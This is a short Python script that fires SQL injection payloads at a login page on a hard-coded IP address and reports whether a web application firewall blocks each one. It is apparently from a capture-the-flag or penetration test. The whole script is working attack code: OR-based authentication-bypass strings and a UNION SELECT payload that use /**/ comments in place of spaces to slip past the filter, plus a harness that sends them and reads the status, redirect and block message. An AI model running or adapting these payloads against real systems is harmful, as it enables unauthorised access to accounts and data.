import requests

def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": payload, "password": "x"},
                       allow_redirects=False)
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:45}] status={r.status_code} loc={r.headers.get('Location')} waf={waf}")

# Rebuild OR-based boolean-true bypass with /**/ instead of spaces
test("admin'/**/OR/**/'1'='1'#", "or-bypass-slashstar")
test("'/**/OR/**/'1'='1'#", "or-bypass-nouser")
test("admin'/**/OR/**/1>0#", "or-gt-bypass")

# Rebuild UNION-based too, just in case (though UNION itself was always blocked regardless of spaces)
test("'/**/UNION/**/SELECT/**/1,'admin','x'#", "union-slashstar")
